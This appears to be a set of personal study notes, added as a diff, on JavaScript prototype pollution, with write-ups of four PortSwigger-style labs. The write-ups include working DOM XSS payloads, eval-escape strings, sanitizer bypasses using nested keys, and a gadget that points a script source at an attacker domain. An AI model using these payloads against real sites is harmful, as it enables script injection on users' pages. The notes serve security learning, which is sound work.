@@ -1,0 +1,218 @@
+Prototype pollution:
+- JS vuln, enable attacker to add arbitrary properties to global object prototypes - which are then inherited by user-defined objects
+- Often unexploitable as standalone vuln, it let attacker control properties of objects that would be unaccessible
+- How vuln arise:
+    + When JS function recursively merges object contain input properties into existing object -> allow inject property like __proto__, along with arbitrary nested properties
+    + Due to special meaning of __proto__ -> merge operation may assign to object's prototype instead of target object itself -> attacker can pollute prototype with harmful values
+    + It's possible to pollute any prototype object, but most commonly occurs with built-in global Object.prototype
+    + Require 3 key components:
+        + A prototype pollution source: any input that enable poisoning prototype object
+        + A sink: JS function or DOM element that enable arbitrary code execution
+        + An exploitable gadget: any property that is passed into a sink without proper filtering or sanitization
+
+Prototype pollution sources:
+- Via the URL:
+    + Example: https://vulnerable-website.com/?__proto__[evilProperty]=payload
+    + When breaking query string into key:value pairs
+        {
+            existingProperty1: 'foo',
+            existingProperty2: 'bar',
+            __proto__: {
+                evilProperty: 'payload'
+            }
+        }
+        -> If targetObject = return object above
+        -> targetObject.__proto__.evilProperty = 'payload';
+    + JS engine treat __proto__ as getter for prototype
+    + Assume that target object use default Object.prototype -> all object in JS will inherit evilProperty, unless they already have property of their own with matching key
+    + Can use this with properties used by application or any import libraries
+
+- Via JSON input:
+    + Input objects often derived from JSON string using JSON.parse() method
+    + JSON.parse() also treat any key in json as arbitrary string (include __proto__) -> potential vector
+    + Example:
+        const objectLiteral = {__proto__: {evilProperty: 'payload'}};
+        const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+
+        objectLiteral.hasOwnProperty('__proto__');     // false
+        objectFromJson.hasOwnProperty('__proto__');    // true
+
+Prototype pollution sinks:
+- Just a JS function or DOM element that you're able to access via prototype pollution - which enable execute arbitrary JS or system command
+- It let you control properties that inaccessible -> enable to reach a number of additional sink with the target application
+- Dev unfamiliar with this may wrongly assume these properties are not user controllable, so they only minimal filtering or sanitization in place
+
+Prototype pollution gadgets:
+- It turning vuln into actual exploit
+- Any property that:
+    + Used by application in unsafe way (such as passing to sink without proper filtering or sanitization)
+    + Attacker-controllable via prototype pollution, object must inherit malicious version of property added to prototype by attacker
+- Property can't be gadget if it is defined directly on object itself
+- Robust web may also explicitly set prototype of object to null, ensure it doesn't inherit any properties at all
+
+- Example of a prototype pollution gadget:
+    + Many JS libraries accept an object to set different options. Example:
+        let chart = new Chart({
+            color: 'red',
+            animate: true,
+            width: 500
+        });
+    + Library code will check whether dev has explicitly added certain properties to this object, if not present, default is used instead
+        let transport_url = config.transport_url || defaults.transport_url;
+    + Imagine library code use transport_url to add script reference to page:
+        let script = document.createElement('script');
+        script.src = `${transport_url}/example.js`;
+        document.body.appendChild(script);
+    + If web dev haven't set transport_url property on config object -> can pollute global Object.prototype with their own transport_url property
+        config.transport_url not found -> Object.__proto__.transport_url
+    + Then set src var to a domain of attacker
+    + Example:
+        Via query param: https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+        Directly embed XSS payload: https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
+
+
+Client-side prototype pollution vulnerabilities:
+- Finding sources manually:
+    + Step 1: Try to inject arbitrary property via query string, URL fragment, any JSON input (Example: /?__proto__[foo]=bar)
+    + Step 2: In browser console, inspect Object.prototype to see if success polluted (Example: Object.prototype.foo, if 'bar' -> success, else fail)
+    + Step 3: If property wasn't added to prototype, using different technique, (such as switching to dot notation /?__proto__.foo=bar, ....)
+    + Step4: Repeat process
+- Finding sources using DOM Invader:
+    https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
+    + Preinstalled with Burp's built-in browser
+    + Automatically test for prototype pollution sources as you browse
+- Finding gadgets manually:
+    + Step 1: Look through source code and identify any properties used by application or any libraries that it import
+    + Step 2: In Burp, intercept response contain JS you want to test
+    + Step 3: Add debugger statement at start of script, forward any remain requests and responses
+    + Step 4: In Burp's browser, go to the page on which target script is loaded. The debugger statement pauses execution of script
+    + Step 5: While script is still paused, switch to console and enter this command (replace YOUR-PROPERTY) with one of properties you think is potential gadget
+        Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+            get() {
+                console.trace();
+                return 'polluted';
+            }
+        })
+        + The property is added to global Object.prototype, and browser will log a stack trace to console whenever it is accessed
+    + Step 6: Press enter to continue execution of script and monitor console. If stack trace appears -> confirm that property was accessed somewhere within the application
+    + Step 7: Expand stack trace and use the provided link jump to line of code where the property is being read
+    + Step 8: Using browser's debugger control, step through each phase of execution to see if property is pass to sink, such as innerHTML, eval()
+    + Step 9: Repeat process
+- Finding gadgets using DOM Invader: (2, 3)
+    + Web often rely on a number of third party libraries, reading thousands of line of minified or obfuscated code -> make things even trickier
+    + DOM Invader can auto scan for gadgets on behalf and generate DOM XSS PoC in some cases
+- Prototype pollution via the constructor:
+    + Common defense is to strip any properties with the key __proto__ from input before merging them
+        + But this approach is flawed as there are alternative ways to reference Object.prototype without relying on the __proto__
+    + Unless set prototype to null (Object.create(null)), every JS object has a constructor property that reference to constructor function
+        + Even create with literal suntax or explicitly invoking object() constructor:
+            let myObjectLiteral = {};
+            let myObject = new Object();
+            myObjectLiteral.constructor            // function Object(){...}
+            myObject.constructor                   // function Object(){...}
+        + Remember that functions are also just object under the hood, each also has a prototype property
+            myObject.constructor.prototype        // Object.prototype
+            myString.constructor.prototype        // String.prototype
+            myArray.constructor.prototype         // Array.prototype
+        -> myObject.constructor.prototype is equivalent to myObject.__proto__
+- Bypassing flawed key sanitization: (4)
+    + An obvious way web attempt to prevent is sanitizing property key before merging them into existing object
+    + Common mistake is failing to recursively sanitize input string
+        vulnerable-website.com/?__pro__proto__to__.gadget=payload
+        strip "__proto__" -> vulnerable-website.com/?__proto__.gadget=payload
+- Prototype pollution in external libraries: (5)
+    + Prototype pollution gadgets may occur in third-party libraries that imported
+    + Recommend using DOM Invader to identify sources and gadgets
+        + Much quicker, ensure won't muss vuln that would be extremely tricky to notice
+
+
+Server-side prototype pollution:
+- 
+
+
+
+
+02_DOM_XSS_via_client_side_prototype_pollution
+- Look at file searchLogger.js, notice these lines of code
+    let config = {params: deparam(new URL(location).searchParams.toString())};
+    if (config.transport_url) {
+        let script = document.createElement('script');
+        script.src = config.transport_url;
+        document.body.appendChild(script);
+    }
+    + It take entire query string as params for config, then assign transport_url to script.src and append it to thepage as follow:
+        <script src="{config.transport_url}"></script>
+- So in order to poison param via query string, we need to analyze this:
+    + Prototype of config is Object-> config.params.__proto__ is point to Object.prototype (can't poison config.__proto__ directly, it only exist .params as pre-defined)
+        Object.getPrototypeOf(config) === Object.prototype
+        Object.getPrototypeOf(config.params) === Object.prototype
+        Object.getPrototypeOf(config.__proto__) === null
+        Object.getPrototypeOf(config.params.__proto__) === null
+    + When config.transport_url is not found 
+        -> It will search for it in its prototype (Object)
+        -> search for config.__proto__.transport_url = {payload}
+    + Then it assign this payload to script.src and create a script tag contain it
+- Payload:
+    /?__proto__[transport_url]=data:,alert(1);
+    /?constructor[prototype][transport_url]=data:,alert(1);
+- Why need ,:
+    + Syntax of data URI
+        data:[<mediatype>][;base64],<data>
+    + Other possible payload:
+        <script src="data:,alert(1)"></script>
+        <script src="data:text/javascript,alert(1)"></script>
+        <script src="data:application/javascript,alert(1)"></script>
+        <script src="data:;base64,YWxlcnQoMSk="></script>
+
+03_DOM_XSS_via_an_alternative_prototype_pollution_vector
+- Look at file searchLoggerAlternative.js, notice searchLogger() function
+    async function searchLogger() {
+        window.macros = {};
+        window.manager = {params: $.parseParams(new URL(location)), macro(property) {
+                if (window.macros.hasOwnProperty(property))
+                    return macros[property]
+            }};
+        let a = manager.sequence || 1;
+        manager.sequence = a + 1;
+
+        eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
+
+        if(manager.params && manager.params.search) {
+            await logQuery('/logger', manager.params);
+        }
+    }
+- Also look at jquery_parseparams.js to know how it parse query
+    a.b=c -> return {a: {b: c}}
+- This lab has a defense using .hasOwnProperty() (ignore inherit) in window.macros -> Can't poison this
+    -> The only exploitable function that we can use here is eval()
+    + If we can inject alert(1) to manager.sequence, macro(alert(1)) will trigger it, or even escape out of function to execute it
+    + So we assign Object.prototype.sequence for fallback of manager.sequence
+- Payload:
+    /?__proto__.sequence=alert(1))}//
+    /?__proto__.sequence=);alert(1)}//
+    /?__proto__.sequence=alert(1)-
+    /?__proto__.sequence=alert(1)/
+    /?__proto__.sequence=alert(1)*
+    /?__proto__.sequence=alert(1)^
+    /?__proto__.sequence=alert(1),
+
+04_Client_side_prototype_pollution_via_flawed_sanitization
+- It just like the lab 02, but added sanitizeKey() function to remove some bad properties
+    function sanitizeKey(key) {
+        let badProperties = ['constructor','__proto__','prototype'];
+        for(let badProperty of badProperties) {
+            key = key.replaceAll(badProperty, '');
+        }
+        return key;
+    }
+    + Easy to see that, it not recursively replace
+    -> Easy way to bypass is insert payload in payload
+- Payload:
+    /?__pr__proto__oto__[transport_url]=data:,alert(1);
+    /?cconstructoronstructor[pprototyperototype][transport_url]=data:,alert(1);
+
+05_Client_side_prototype_pollution_in_third_party_libraries
+- Nothing, just using DOM Invader to find potential gadget
+- Payload:
+    #constructor[prototype][hitCallback]=alert(1)
+    #__proto__[hitCallback]=alert(1)
